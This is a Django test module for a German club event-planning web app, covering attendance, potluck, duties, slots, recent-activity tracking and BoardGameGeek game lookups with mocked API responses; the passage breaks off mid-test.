import datetime
import re
from decimal import Decimal
from io import BytesIO, StringIO
from types import SimpleNamespace
from unittest.mock import Mock, patch

import openpyxl
import requests
from allauth.account.models import EmailAddress
from allauth.core import context as allauth_context
from django.contrib.auth import get_user_model
from django.contrib.sessions.middleware import SessionMiddleware
from django.core import mail
from django.core.cache import cache
from django.core.exceptions import ValidationError
from django.core.management import call_command
from django.db import connection
from django.template import Context, Template
from django.template.loader import render_to_string
from django.test import Client, RequestFactory, SimpleTestCase, TestCase, override_settings
from django.urls import reverse
from django.utils import timezone

from . import bgg
from .account_forms import RequestLoginCodeOrSignupForm, prune_unconfirmed_accounts
from .forms import GameBulkForm, GameEntryForm
from .models import (
    Answer,
    Attendance,
    Decline,
    Duty,
    DutySignup,
    Event,
    EventDay,
    EventVisit,
    GameBringClaim,
    GameComment,
    GameEntry,
    GameExplainClaim,
    GameInterest,
    Idea,
    IdeaComment,
    IdeaCommentNotification,
    IdeaLike,
    OrgaActionLog,
    PotluckClaim,
    PotluckItem,
    Question,
    QuestionReaction,
    Slot,
    SiteSettings,
    SlotSignup,
    UserProfile,
    is_known_person,
)
from .notifications import queue_idea_comment_notifications, send_pending_idea_comment_notifications
from .views import _event_user_profiles

User = get_user_model()

SAMPLE_BGG_XML = b"""<?xml version="1.0" encoding="utf-8"?>
<items termsofuse="https://boardgamegeek.com/xmlapi/termsofuse">
  <item type="boardgame" id="13">
    <thumbnail>https://cf.geekdo-images.com/thumb.jpg</thumbnail>
    <name type="primary" sortindex="1" value="CATAN"/>
    <name type="alternate" sortindex="1" value="Catan (Alternate)"/>
    <minplayers value="3"/>
    <maxplayers value="4"/>
    <playingtime value="120"/>
    <minage value="10"/>
    <yearpublished value="1995"/>
    <description>Trade, build &amp; settle.</description>
    <link type="boardgamecategory" id="1015" value="Civilization"/>
    <link type="boardgamemechanic" id="2002" value="Dice Rolling"/>
    <statistics>
      <ratings>
        <average value="7.1234"/>
        <averageweight value="2.3168"/>
      </ratings>
    </statistics>
  </item>
</items>
"""

EMPTY_BGG_XML = b"""<?xml version="1.0" encoding="utf-8"?>
<items termsofuse="https://boardgamegeek.com/xmlapi/termsofuse"></items>
"""

SAMPLE_BGG_SEARCH_XML = b"""<?xml version="1.0" encoding="utf-8"?>
<items termsofuse="https://boardgamegeek.com/xmlapi2/termsofuse">
  <item type="boardgame" id="13">
    <name type="primary" value="CATAN"/>
    <yearpublished value="1995"/>
  </item>
  <item type="boardgame" id="277">
    <name type="primary" value="Catan: Seefahrer"/>
    <yearpublished value="1997"/>
  </item>
</items>
"""


@patch.dict(
    "os.environ",
    {
        "IMPRINT_NAME": "Beispielverein e. V.",
        "IMPRINT_STREET": "Musterstraße 1",
        "IMPRINT_CITY": "12345 Musterstadt",
        "IMPRINT_EMAIL": "kontakt@example.org",
    },
)
class LegalFooterTests(SimpleTestCase):
    def test_footer_contains_environment_controlled_imprint_and_privacy(self):
        html = render_to_string("base.html")

        self.assertIn("Beispielverein e. V.", html)
        self.assertIn("Musterstraße 1", html)
        self.assertIn("12345 Musterstadt", html)
        self.assertIn("kontakt@example.org", html)
        self.assertIn('data-dialog-open="privacy-dialog"', html)
        self.assertIn("Es gibt keine Werbung, Analyse oder Tracking-Cookies.", html)


class SiteSettingsTests(TestCase):
    def test_load_creates_singleton_with_name_from_env(self):
        SiteSettings.objects.all().delete()
        with patch.dict("os.environ", {"SITE_NAME": "Testverein"}):
            obj = SiteSettings.load()
        self.assertEqual(obj.pk, 1)
        self.assertEqual(obj.name, "Testverein")
        self.assertEqual(SiteSettings.load().pk, 1)

    def test_base_header_uses_site_name_and_placeholder_logo(self):
        SiteSettings.objects.update_or_create(pk=1, defaults={"name": "Testverein"})
        html = render_to_string("base.html", request=RequestFactory().get("/"))
        self.assertIn("Testverein", html)
        # Platzhalter-Logo (ggf. mit Hash im Dateinamen durch Manifest-Storage)
        self.assertRegex(html, r"events/img/logo(\.[0-9a-f]+)?\.svg")
        self.assertNotIn("logo.png", html)

    def test_site_logo_view(self):
        SiteSettings.objects.update_or_create(pk=1, defaults={"name": "Testverein"})
        # Ohne Logo: 404
        response = self.client.get(reverse("events:site_logo"))
        self.assertEqual(response.status_code, 404)
        # Mit Logo: öffentlich auslieferbar, nur Bilder
        import tempfile
        from django.core.files.base import ContentFile
        with override_settings(MEDIA_ROOT=tempfile.mkdtemp()):
            site = SiteSettings.load()
            site.logo.save("logo.png", ContentFile(b"\x89PNG\r\n\x1a\n"), save=True)
            response = self.client.get(reverse("events:site_logo"))
            self.assertEqual(response.status_code, 200)
            self.assertEqual(response["Content-Type"], "image/png")
            site.logo.save("evil.html", ContentFile(b"<html>"), save=True)
            response = self.client.get(reverse("events:site_logo"))
            self.assertEqual(response.status_code, 404)


class UserProfilePopupTests(SimpleTestCase):
    class RelatedList:
        def __init__(self, values):
            self.values = values

        def all(self):
            return self.values

    def test_user_link_has_consistent_icon_and_dialog_target(self):
        html = Template(
            '{% load events_extras %}{% user_link person event "Alice" %}'
        ).render(Context({"person": SimpleNamespace(pk=7), "event": SimpleNamespace(pk=3)}))

        self.assertIn('class="user-link"', html)
        self.assertIn('class="fa-solid fa-user"', html)
        self.assertIn('data-user-profile-id="7"', html)
        self.assertIn('href="#user-profile-dialog"', html)
        self.assertIn("Alice", html)

    def test_event_profile_collects_potluck_games_and_duties(self):
        user_id = 7
        event = SimpleNamespace(
            potluck_items=self.RelatedList(
                [
                    SimpleNamespace(
                        title="Salat",
                        claims=self.RelatedList(
                            [SimpleNamespace(user_id=user_id, quantity=2, comment="vegan")]
                        ),
                    )
                ]
            ),
            games=self.RelatedList(
                [
                    SimpleNamespace(
                        name="Catan",
                        bring_claims=self.RelatedList([SimpleNamespace(user_id=user_id)]),
                    )
                ]
            ),
            duties=self.RelatedList(
                [
                    SimpleNamespace(
                        title="Aufbau",
                        day=SimpleNamespace(display_label="Sa, 18.07.2026"),
                        start_time=datetime.time(9, 0),
                        end_time=datetime.time(10, 30),
                        signups=self.RelatedList([SimpleNamespace(user_id=user_id)]),
                    )
                ]
            ),
        )

        profile = _event_user_profiles(event)[str(user_id)]

        self.assertEqual(profile["potluck"], ["2 × Salat (vegan)"])
        self.assertEqual(profile["games"], ["Catan"])
        self.assertEqual(profile["duties"], ["Aufbau – Sa, 18.07.2026, 09:00–10:30 Uhr"])


class EventSectionNavigationTests(TestCase):
    def test_navigation_links_to_every_event_section(self):
        user = User.objects.create(username="nav-user", email="nav@example.com")
        event = Event.objects.create(title="Navigationstest", created_by=user)
        client = Client(SERVER_NAME="localhost")
        client.force_login(user)

        response = client.get(f"/{event.pk}/")

        self.assertEqual(response.status_code, 200)
        self.assertContains(response, 'aria-label="Bereiche dieser Veranstaltung"')
        for section_id in (
            "attendance-section",
            "potluck-section",
            "duties-section",
            "ideas-section",
            "questions-section",
            "slots-section",
            "games-section",
        ):
            self.assertContains(response, f'href="#{section_id}"')
            self.assertContains(response, f'id="{section_id}"')
        self.assertContains(response, "events/js/event-section-nav.")


class PotluckRemainingTests(TestCase):
    def setUp(self):
        self.user = User.objects.create(username="alice", email="alice@example.com")
        self.other = User.objects.create(username="bob", email="bob@example.com")
        self.event = Event.objects.create(title="Testevent", created_by=self.user)
        # Claims von Nutzern ohne Anwesenheit zählen laut PotluckItem.claimed_quantity
        # nicht mit, daher müssen beide hier als teilnehmend markiert werden.
        Attendance.objects.create(event=self.event, user=self.user)
        Attendance.objects.create(event=self.event, user=self.other)

    def test_remaining_without_target_is_none(self):
        item = PotluckItem.objects.create(event=self.event, title="Servietten")
        self.assertIsNone(item.remaining)

    def test_remaining_decreases_with_claims(self):
        item = PotluckItem.objects.create(event=self.event, title="Butter", needed_quantity=3)
        PotluckClaim.objects.create(item=item, user=self.user, quantity=1)
        PotluckClaim.objects.create(item=item, user=self.other, quantity=1)
        self.assertEqual(item.remaining, 1)

    def test_remaining_does_not_go_negative(self):
        item = PotluckItem.objects.create(event=self.event, title="Brot", needed_quantity=1)
        PotluckClaim.objects.create(item=item, user=self.user, quantity=5)
        self.assertEqual(item.remaining, 0)

    def test_variable_target_quantity_scales_with_attendee_count(self):
        # setUp bringt bereits 2 Anmeldungen mit (self.user, self.other).
        item = PotluckItem.objects.create(
            event=self.event, title="Käse", variable_quantity=1, variable_per_persons=10
        )
        self.assertTrue(item.is_variable)
        self.assertEqual(item.target_quantity, 1)

    def test_variable_target_quantity_increases_past_threshold(self):
        item = PotluckItem.objects.create(
            event=self.event, title="Käse", variable_quantity=1, variable_per_persons=10
        )
        for i in range(9):
            user = User.objects.create(username=f"extra{i}", email=f"extra{i}@example.com")
            Attendance.objects.create(event=self.event, user=user)
        # 2 (aus setUp) + 9 = 11 Anmeldungen -> überschreitet die 10er-Schwelle.
        self.assertEqual(item.target_quantity, 2)

    def test_clean_rejects_fixed_and_variable_together(self):
        item = PotluckItem(
            event=self.event, title="Käse", needed_quantity=1, variable_quantity=1, variable_per_persons=10
        )
        with self.assertRaises(ValidationError):
            item.clean()

    def test_clean_rejects_incomplete_variable_pair(self):
        item = PotluckItem(event=self.event, title="Käse", variable_quantity=1)
        with self.assertRaises(ValidationError):
            item.clean()


class EventCanManageTests(TestCase):
    def setUp(self):
        self.owner = User.objects.create(username="owner", email="owner@example.com")
        self.editor = User.objects.create(username="editor", email="editor@example.com")
        self.other = User.objects.create(username="other", email="other@example.com")
        self.superuser = User.objects.create(username="root", email="root@example.com", is_superuser=True)
        self.event = Event.objects.create(title="Testevent", created_by=self.owner)
        self.event.editors.add(self.editor)

    def test_owner_can_manage(self):
        self.assertTrue(self.event.can_manage(self.owner))

    def test_editor_can_manage(self):
        self.assertTrue(self.event.can_manage(self.editor))

    def test_superuser_can_manage(self):
        self.assertTrue(self.event.can_manage(self.superuser))

    def test_other_user_cannot_manage(self):
        self.assertFalse(self.event.can_manage(self.other))


class AttendanceEditTests(TestCase):
    def setUp(self):
        self.owner = User.objects.create(username="owner", email="owner@example.com")
        self.other = User.objects.create(username="other", email="other@example.com")
        self.event = Event.objects.create(title="Testevent", created_by=self.owner)
        self.day = EventDay.objects.create(event=self.event, date=datetime.date(2026, 9, 5))
        self.attendance = Attendance.objects.create(event=self.event, user=self.other, name="Bob")
        self.attendance.days.add(self.day)

    def _post_data(self, **overrides):
        data = {
            "role": "member",
            "days": [self.day.pk],
            "invited_by": "",
            "comment": "",
            "brought_people-TOTAL_FORMS": "0",
            "brought_people-INITIAL_FORMS": "0",
            "brought_people-MIN_NUM_FORMS": "0",
            "brought_people-MAX_NUM_FORMS": "1000",
        }
        data.update(overrides)
        return data

    def test_owner_can_edit_own_attendance(self):
        client = Client(SERVER_NAME="localhost")
        client.force_login(self.other)
        client.post(f"/anwesenheit/{self.attendance.pk}/bearbeiten/", self._post_data())
        self.attendance.refresh_from_db()
        self.assertEqual(self.attendance.name, "Bob")

    def test_orga_can_edit_others_attendance(self):
        client = Client(SERVER_NAME="localhost")
        client.force_login(self.owner)
        client.post(f"/anwesenheit/{self.attendance.pk}/bearbeiten/", self._post_data())
        self.attendance.refresh_from_db()
        self.assertEqual(self.attendance.name, "Bob")

    def test_unrelated_user_cannot_edit(self):
        stranger = User.objects.create(username="stranger", email="stranger@example.com")
        client = Client(SERVER_NAME="localhost")
        client.force_login(stranger)
        response = client.post(f"/anwesenheit/{self.attendance.pk}/bearbeiten/", self._post_data())
        self.assertEqual(response.status_code, 403)
        self.attendance.refresh_from_db()
        self.assertEqual(self.attendance.name, "Bob")

    def test_owner_can_add_brought_person_after_initial_registration(self):
        client = Client(SERVER_NAME="localhost")
        client.force_login(self.other)
        data = self._post_data(
            **{
                # The edit page contains one empty extra row. Clicking “mehr”
                # adds the filled person as the second form.
                "brought_people-TOTAL_FORMS": "2",
                "brought_people-0-name": "",
                "brought_people-0-role": "guest",
                "brought_people-1-name": "Charlie",
                "brought_people-1-role": "guest",
                "brought_people-1-days": [self.day.pk],
            }
        )

        response = client.post(f"/anwesenheit/{self.attendance.pk}/bearbeiten/", data)

        self.assertEqual(response.status_code, 302)
        person = self.attendance.brought_people.get()
        self.assertEqual(person.name, "Charlie")
        self.assertEqual(list(person.days.all()), [self.day])

    def test_invalid_brought_person_shows_clear_warning_and_field_error(self):
        client = Client(SERVER_NAME="localhost")
        client.force_login(self.other)
        data = self._post_data(
            **{
                "brought_people-TOTAL_FORMS": "1",
                "brought_people-0-name": "Charlie",
                "brought_people-0-role": "guest",
                # No attendance day selected for Charlie.
            }
        )

        response = client.post(f"/anwesenheit/{self.attendance.pk}/bearbeiten/", data)

        self.assertEqual(response.status_code, 200)
        self.assertContains(response, "Die Änderungen wurden nicht gespeichert")
        self.assertContains(response, "Speichern nicht möglich")
        self.assertContains(response, "Bitte wähle mindestens einen Anwesenheitstag aus.")
        self.assertContains(response, 'value="Charlie"')
        self.assertFalse(self.attendance.brought_people.exists())

    @patch("events.views.BroughtPersonFormSet.save", side_effect=RuntimeError("database error"))
    def test_edit_rolls_back_main_form_when_brought_people_save_fails(self, _save):
        client = Client(SERVER_NAME="localhost")
        client.force_login(self.other)
        data = self._post_data(comment="Dieser Text darf nicht gespeichert bleiben")

        with self.assertRaises(RuntimeError):
            client.post(f"/anwesenheit/{self.attendance.pk}/bearbeiten/", data)

        self.attendance.refresh_from_db()
        self.assertEqual(self.attendance.comment, "")

    def test_owner_can_edit_existing_brought_person(self):
        second_day = EventDay.objects.create(event=self.event, date=datetime.date(2026, 9, 6))
        person = self.attendance.brought_people.create(name="Charlie", role="guest")
        person.days.add(self.day)
        client = Client(SERVER_NAME="localhost")
        client.force_login(self.other)
        data = self._post_data(
            **{
                "brought_people-TOTAL_FORMS": "1",
                "brought_people-INITIAL_FORMS": "1",
                "brought_people-0-id": str(person.pk),
                "brought_people-0-name": "Charlotte",
                "brought_people-0-role": "member",
                "brought_people-0-days": [self.day.pk, second_day.pk],
            }
        )

        response = client.post(f"/anwesenheit/{self.attendance.pk}/bearbeiten/", data)

        self.assertEqual(response.status_code, 302)
        person.refresh_from_db()
        self.assertEqual(person.name, "Charlotte")
        self.assertEqual(person.role, "member")
        self.assertCountEqual(person.days.values_list("pk", flat=True), [self.day.pk, second_day.pk])

    def test_owner_can_add_person_while_editing_existing_brought_person(self):
        existing = self.attendance.brought_people.create(name="Charlie", role="guest")
        existing.days.add(self.day)
        client = Client(SERVER_NAME="localhost")
        client.force_login(self.other)
        data = self._post_data(
            **{
                "brought_people-TOTAL_FORMS": "2",
                "brought_people-INITIAL_FORMS": "1",
                "brought_people-0-id": str(existing.pk),
                "brought_people-0-name": "Charlie",
                "brought_people-0-role": "guest",
                "brought_people-0-days": [self.day.pk],
                "brought_people-1-name": "Dana",
                "brought_people-1-role": "member",
                "brought_people-1-days": [self.day.pk],
            }
        )

        response = client.post(f"/anwesenheit/{self.attendance.pk}/bearbeiten/", data)

        self.assertEqual(response.status_code, 302)
        self.assertCountEqual(
            self.attendance.brought_people.values_list("name", flat=True),
            ["Charlie", "Dana"],
        )

    def test_owner_can_remove_existing_brought_person_while_editing(self):
        person = self.attendance.brought_people.create(name="Charlie", role="guest")
        person.days.add(self.day)
        client = Client(SERVER_NAME="localhost")
        client.force_login(self.other)
        data = self._post_data(
            **{
                "brought_people-TOTAL_FORMS": "1",
                "brought_people-INITIAL_FORMS": "1",
                "brought_people-0-id": str(person.pk),
                "brought_people-0-name": "Charlie",
                "brought_people-0-role": "guest",
                "brought_people-0-days": [self.day.pk],
                "brought_people-0-DELETE": "on",
            }
        )

        response = client.post(f"/anwesenheit/{self.attendance.pk}/bearbeiten/", data)

        self.assertEqual(response.status_code, 302)
        self.assertFalse(self.attendance.brought_people.exists())

    def test_invalid_edit_does_not_partially_change_existing_brought_person(self):
        person = self.attendance.brought_people.create(name="Charlie", role="guest")
        person.days.add(self.day)
        client = Client(SERVER_NAME="localhost")
        client.force_login(self.other)
        data = self._post_data(
            comment="Dieser Kommentar darf nicht gespeichert werden",
            **{
                "brought_people-TOTAL_FORMS": "1",
                "brought_people-INITIAL_FORMS": "1",
                "brought_people-0-id": str(person.pk),
                "brought_people-0-name": "Charlotte",
                "brought_people-0-role": "member",
                # The required attendance day is deliberately missing.
            },
        )

        response = client.post(f"/anwesenheit/{self.attendance.pk}/bearbeiten/", data)

        self.assertEqual(response.status_code, 200)
        self.assertContains(response, "Die Änderungen wurden nicht gespeichert")
        person.refresh_from_db()
        self.attendance.refresh_from_db()
        self.assertEqual(person.name, "Charlie")
        self.assertEqual(person.role, "guest")
        self.assertEqual(list(person.days.all()), [self.day])
        self.assertEqual(self.attendance.comment, "")

    def test_orga_can_edit_existing_brought_person(self):
        person = self.attendance.brought_people.create(name="Charlie", role="guest")
        person.days.add(self.day)
        client = Client(SERVER_NAME="localhost")
        client.force_login(self.owner)
        data = self._post_data(
            **{
                "brought_people-TOTAL_FORMS": "1",
                "brought_people-INITIAL_FORMS": "1",
                "brought_people-0-id": str(person.pk),
                "brought_people-0-name": "Von der Orga geändert",
                "brought_people-0-role": "guest",
                "brought_people-0-days": [self.day.pk],
            }
        )

        response = client.post(f"/anwesenheit/{self.attendance.pk}/bearbeiten/", data)

        self.assertEqual(response.status_code, 302)
        person.refresh_from_db()
        self.assertEqual(person.name, "Von der Orga geändert")
        self.assertTrue(
            OrgaActionLog.objects.filter(
                event=self.event,
                actor=self.owner,
                description__contains="Anmeldung von",
            ).exists()
        )


class EventAttendanceListTests(TestCase):
    def test_attendance_list_prefers_self_selected_display_name(self):
        owner = User.objects.create(username="owner")
        attendee = User.objects.create(username="rkfp.bn")
        UserProfile.objects.create(user=attendee, display_name="Gewählter Anzeigename")
        event = Event.objects.create(title="Testevent", created_by=owner)
        day = EventDay.objects.create(event=event, date=datetime.date(2026, 9, 5))
        attendance = Attendance.objects.create(event=event, user=attendee, name="rkfp.bn")
        attendance.days.add(day)

        client = Client(SERVER_NAME="localhost")
        client.force_login(owner)
        response = client.get(f"/{event.pk}/")

        self.assertContains(response, "Gewählter Anzeigename")
        self.assertNotContains(response, "rkfp.bn")

    def test_attendance_heading_counts_accounts_and_additional_people(self):
        attendee = User.objects.create(username="familie")
        event = Event.objects.create(title="Testevent", created_by=attendee)
        day = EventDay.objects.create(event=event, date=datetime.date(2026, 9, 5))
        attendance = Attendance.objects.create(event=event, user=attendee)
        attendance.days.add(day)
        additional_person = attendance.brought_people.create(name="Weitere Person", role="member")
        additional_person.days.add(day)

        client = Client(SERVER_NAME="localhost")
        client.force_login(attendee)
        response = client.get(f"/{event.pk}/")

        self.assertContains(response, "Anwesenheitsliste (2 Personen)")

    def test_attendance_list_shows_comment(self):
        owner = User.objects.create(username="owner")
        attendee = User.objects.create(username="attendee")
        event = Event.objects.create(title="Testevent", created_by=owner)
        day = EventDay.objects.create(event=event, date=datetime.date(2026, 9, 5))
        attendance = Attendance.objects.create(
            event=event,
            user=attendee,
            name="Testperson",
            comment="Kommt erst am Nachmittag",
        )
        attendance.days.add(day)

        client = Client(SERVER_NAME="localhost")
        client.force_login(attendee)
        response = client.get(f"/{event.pk}/")

        self.assertContains(response, "Kommt erst am Nachmittag")

    def test_guest_list_shows_who_the_guest_comes_via(self):
        host = User.objects.create(username="gustav")
        guest = User.objects.create(username="max")
        event = Event.objects.create(title="Testevent", created_by=host)
        day = EventDay.objects.create(event=event, date=datetime.date(2026, 9, 5))

        host_attendance = Attendance.objects.create(event=event, user=host, name="Testmitglied A")
        host_attendance.days.add(day)
        brought_guest = host_attendance.brought_people.create(name="Testgast B", role="guest")
        brought_guest.days.add(day)

        direct_guest = Attendance.objects.create(
            event=event,
            user=guest,
            name="Testgast C",
            role="guest",
            invited_by="Testmitglied A",
        )
        direct_guest.days.add(day)

        client = Client(SERVER_NAME="localhost")
        client.force_login(host)
        response = client.get(f"/{event.pk}/")

        attribution = '<span class="muted small">(Nichtmitglied, über Testmitglied A)</span>'
        self.assertContains(response, attribution, count=2, html=True)

    def test_decline_list_uses_german_plural_and_shows_reason(self):
        owner = User.objects.create(username="owner")
        second_user = User.objects.create(username="second")
        event = Event.objects.create(title="Testevent", created_by=owner)
        Decline.objects.create(event=event, user=owner, comment="Testgrund")
        Decline.objects.create(event=event, user=second_user)

        client = Client(SERVER_NAME="localhost")
        client.force_login(owner)
        response = client.get(f"/{event.pk}/")

        self.assertContains(response, "2 Absagen")
        self.assertNotContains(response, "Absages")
        self.assertContains(response, "Grund: Testgrund")


class RecentEventChangesTests(TestCase):
    def setUp(self):
        self.user = User.objects.create(username="visitor")
        self.other = User.objects.create(username="other")
        self.event = Event.objects.create(title="Testevent", created_by=self.user)
        self.day = EventDay.objects.create(event=self.event, date=datetime.date(2026, 9, 5))
        self.client = Client(SERVER_NAME="localhost")
        self.client.force_login(self.user)

    def test_first_visit_starts_tracking_without_listing_old_content(self):
        Attendance.objects.create(event=self.event, user=self.other, name="Alter Testeintrag")

        response = self.client.get(f"/{self.event.pk}/")

        self.assertContains(response, "Ab jetzt werden dir hier neue Aktivitäten anderer Personen")
        self.assertTrue(EventVisit.objects.filter(event=self.event, user=self.user).exists())
        self.assertNotContains(response, "Neue Anmeldungen")

    def test_next_visit_groups_new_activity_and_then_marks_it_seen(self):
        self.client.get(f"/{self.event.pk}/")
        attendance = Attendance.objects.create(
            event=self.event,
            user=self.other,
            name="Neue Testperson",
        )
        attendance.days.add(self.day)
        idea = Idea.objects.create(event=self.event, text="Neue Testidee", author=self.other)
        IdeaComment.objects.create(idea=idea, author=self.other, text="Neuer Testkommentar")
        game = GameEntry.objects.create(event=self.event, name="Testspiel", type="bring", created_by=self.other)
        GameBringClaim.objects.create(game=game, user=self.other)

        response = self.client.get(f"/{self.event.pk}/")

        self.assertContains(response, "Neue Anmeldungen")
        self.assertContains(response, "Neue Testperson")
        self.assertContains(response, "Neue Kommentare")
        self.assertContains(response, "Neuer Testkommentar")
        self.assertContains(response, "Neue Ideen")
        self.assertContains(response, "Neue Mitbring-Zusagen für Spiele")
        self.assertNotContains(response, '<details class="recent-changes feature" open>', html=False)

        next_response = self.client.get(f"/{self.event.pk}/")
        self.assertContains(next_response, "Es gibt nichts neues seit deinem letzten Besuch")
        self.assertNotContains(next_response, '<details class="recent-changes feature">', html=False)
        self.assertNotContains(next_response, "Neu seit deinem letzten Besuch")
        self.assertNotContains(next_response, "<h3>Neue Anmeldungen</h3>", html=True)

    def test_anonymous_visit_has_no_personal_change_box(self):
        self.client.logout()

        response = self.client.get(f"/{self.event.pk}/")

        self.assertNotContains(response, "Neu seit deinem letzten Besuch")
        self.assertFalse(EventVisit.objects.exists())

    def test_own_activity_is_not_reported_as_new(self):
        self.client.get(f"/{self.event.pk}/")
        Idea.objects.create(event=self.event, text="Meine eigene Idee", author=self.user)

        response = self.client.get(f"/{self.event.pk}/")

        self.assertContains(response, "Es gibt nichts neues seit deinem letzten Besuch")
        self.assertNotContains(response, "<h3>Neue Ideen</h3>", html=True)
        self.assertNotContains(response, "Neu seit deinem letzten Besuch")

    def test_recent_activity_is_limited(self):
        self.client.get(f"/{self.event.pk}/")
        Idea.objects.bulk_create(
            Idea(event=self.event, text=f"Idee {number:03d}", author=self.other)
            for number in range(101)
        )

        response = self.client.get(f"/{self.event.pk}/")

        self.assertEqual(response.context["recent_change_count"], 100)
        self.assertContains(response, "Es werden höchstens 100 neue Aktivitäten angezeigt.")
        reported_items = [
            item for group in response.context["recent_changes"] for item in group["items"]
        ]
        self.assertIn("Idee 099", reported_items)
        self.assertNotIn("Idee 100", reported_items)


class SlotCapacityTests(TestCase):
    def setUp(self):
        self.alice = User.objects.create(username="alice", email="alice@example.com")
        self.bob = User.objects.create(username="bob", email="bob@example.com")
        self.event = Event.objects.create(title="Testevent", created_by=self.alice)
        self.day = EventDay.objects.create(event=self.event, date=datetime.date(2026, 9, 5))
        self.slot = Slot.objects.create(
            event=self.event,
            day=self.day,
            title="Kochworkshop",
            start_time=datetime.time(17, 0),
            end_time=datetime.time(18, 0),
            max_participants=1,
            created_by=self.alice,
        )

    def test_slot_is_full_after_max_signups(self):
        SlotSignup.objects.create(slot=self.slot, user=self.alice)
        self.assertTrue(self.slot.is_full)
        self.assertEqual(self.slot.spots_left, 0)

    def test_view_rejects_signup_when_full(self):
        SlotSignup.objects.create(slot=self.slot, user=self.alice)
        client = Client(SERVER_NAME="localhost")
        client.force_login(self.bob)
        client.post(f"/slots/{self.slot.id}/anmelden/")
        self.assertEqual(self.slot.signups.count(), 1)
        self.assertFalse(self.slot.signups.filter(user=self.bob).exists())

    def test_view_allows_signup_when_free(self):
        client = Client(SERVER_NAME="localhost")
        client.force_login(self.bob)
        client.post(f"/slots/{self.slot.id}/anmelden/")
        self.assertTrue(self.slot.signups.filter(user=self.bob).exists())


class BggLookupTests(TestCase):
    @override_settings(BGG_API_TOKEN="test-token")
    @patch("events.bgg.requests.get")
    def test_fetch_bgg_game_parses_fields(self, mock_get):
        mock_response = Mock()
        mock_response.content = SAMPLE_BGG_XML
        mock_response.status_code = 200
        mock_response.raise_for_status = Mock()
        mock_get.return_value = mock_response

        data = bgg.fetch_bgg_game(13)

        self.assertEqual(data["name"], "CATAN")
        self.assertEqual(data["min_players"], 3)
        self.assertEqual(data["max_players"], 4)
        self.assertEqual(data["playtime_minutes"], 120)
        self.assertEqual(data["min_age"], 10)
        self.assertEqual(data["year"], 1995)
        self.assertEqual(data["complexity"], Decimal("2.32"))
        self.assertEqual(data["rating"], Decimal("7.12"))
        self.assertEqual(data["description"], "Trade, build & settle.")
        self.assertEqual(data["categories"], ["Civilization"])
        self.assertEqual(data["mechanics"], ["Dice Rolling"])
        self.assertEqual(data["thumbnail_url"], "https://cf.geekdo-images.com/thumb.jpg")
        self.assertEqual(mock_get.call_args.kwargs["headers"], {"Authorization": "Bearer test-token"})

    @override_settings(BGG_API_TOKEN="test-token")
    @patch("events.bgg.requests.get")
    def test_fetch_bgg_game_raises_when_not_found(self, mock_get):
        mock_response = Mock()
        mock_response.content = EMPTY_BGG_XML
        mock_response.status_code = 200
        mock_response.raise_for_status = Mock()
        mock_get.return_value = mock_response

        with self.assertRaises(bgg.BggLookupError):
            bgg.fetch_bgg_game(999999)

    @override_settings(BGG_API_TOKEN="test-token")
    @patch("events.bgg.requests.get")
    def test_fetch_bgg_game_raises_on_network_error(self, mock_get):
        mock_get.side_effect = requests.ConnectionError("boom")

        with self.assertRaises(bgg.BggLookupError):
            bgg.fetch_bgg_game(13)

    def test_search_bgg_games_requires_at_least_two_characters(self):
        with override_settings(BGG_API_TOKEN="test-token"):
            self.assertEqual(bgg.search_bgg_games("c"), [])

    @override_settings(BGG_API_TOKEN="test-token")
    @patch("events.bgg.requests.get")
    def test_search_bgg_games_parses_results(self, mock_get):
        mock_response = Mock()
        mock_response.content = SAMPLE_BGG_SEARCH_XML
        mock_response.status_code = 200
        mock_response.raise_for_status = Mock()
        mock_get.return_value = mock_response

        results = bgg.search_bgg_games("catan")

        self.assertEqual(
            results,
            [
                {"id": 13, "name": "CATAN", "year": "1995"},
                {"id": 277, "name": "Catan: Seefahrer", "year": "1997"},
            ],
        )
        self.assertEqual(mock_get.call_args.kwargs["headers"], {"Authorization": "Bearer test-token"})

    @override_settings(BGG_API_TOKEN="test-token")
    @patch("events.bgg.requests.get")
    def test_search_bgg_games_puts_exact_title_first(self, mock_get):
        # BGG sortiert alphabetisch; „Omens“ stand hinter acht anderen Treffern.
        others = "".join(
            f'<item type="boardgame" id="{100 + i}"><name type="primary" value="{prefix} Omens"/></item>'
            for i, prefix in enumerate(["18", "9", "Echo of", "Elder Sign:", "Good", "Hex:", "Many", "More"])
        )
        mock_get.return_value = Mock(
            status_code=200,
            raise_for_status=Mock(),
            content=f'<items>{others}<item type="boardgame" id="428787"><name type="primary" value="Omens"/>'
            f'<yearpublished value="2025"/></item></items>'.encode(),
        )

        results = bgg.search_bgg_games("omens")

        self.assertEqual(results[0], {"id": 428787, "name": "Omens", "year": "2025"})
        self.assertEqual(len(results), bgg.BGG_SEARCH_MAX_RESULTS)

    @override_settings(BGG_API_TOKEN="test-token")
    @patch("events.bgg.fetch_bgg_game")
    def test_search_bgg_games_accepts_pasted_link(self, mock_fetch):
        mock_fetch.return_value = {"name": "Omens", "year": 2025}

        results = bgg.search_bgg_games("https://boardgamegeek.com/boardgame/428787/omens")

        self.assertEqual(results, [{"id": 428787, "name": "Omens", "year": "2025"}])
        mock_fetch.assert_called_once_with(428787)

    def test_bgg_id_from_link_ignores_plain_numbers(self):
        self.assertIsNone(bgg.bgg_id_from_link("1830"))
        self.assertEqual(bgg.bgg_id_from_link("boardgamegeek.com/boardgameexpansion/325/catan-seafarers"), 325)


class GameBggApiViewTests(TestCase):
    def setUp(self):
        self.user = User.objects.create(username="bgg-user", email="bgg@example.com")
        self.client = Client(SERVER_NAME="localhost")

    def test_search_requires_login(self):
        response = self.client.get("/spiele/bgg-suche/", {"q": "catan"})
        self.assertEqual(response.status_code, 302)

    @patch("events.views.bgg.search_bgg_games")
    def test_search_returns_json_results(self, mock_search):
        self.client.force_login(self.user)
        mock_search.return_value = [{"id": 13, "name": "CATAN", "year": "1995"}]

        response = self.client.get("/spiele/bgg-suche/", {"q": "catan"})

        self.assertEqual(response.status_code, 200)
        self.assertEqual(response.json(), {"results": [{"id": 13, "name": "CATAN", "year": "1995"}]})
        mock_search.assert_called_once_with("catan")

    @patch("events.views.bgg.search_bgg_games")
    def test_search_reports_bgg_errors_as_json(self, mock_search):
        self.client.force_login(self.user)
        mock_search.side_effect = bgg.BggLookupError("BGG war nicht erreichbar")

        response = self.client.get("/spiele/bgg-suche/", {"q": "catan"})

        self.assertEqual(response.status_code, 502)
        self.assertIn("error", response.json())

    @patch("events.views.bgg.fetch_bgg_game")
    def test_lookup_returns_json_data(self, mock_fetch):
        self.client.force_login(self.user)
        mock_fetch.return_value = {
